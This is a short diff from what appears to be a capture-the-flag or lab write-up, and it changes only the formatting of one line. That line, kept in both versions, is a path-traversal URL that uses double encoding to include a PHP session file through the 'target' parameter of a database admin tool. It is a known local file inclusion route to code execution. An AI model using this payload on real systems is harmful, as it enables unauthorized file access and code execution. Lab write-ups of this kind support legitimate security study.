@@ -86,7 +86,7 @@ Once authenticated it is possible to execute SQL queries on the databases presen
 
 The URL must be edited to the following format:
 
-**`http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{cookieVal}`**
+`http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_{cookieVal}`
 
 replacing `{cookieVal}` with the current session's cookie value.
 
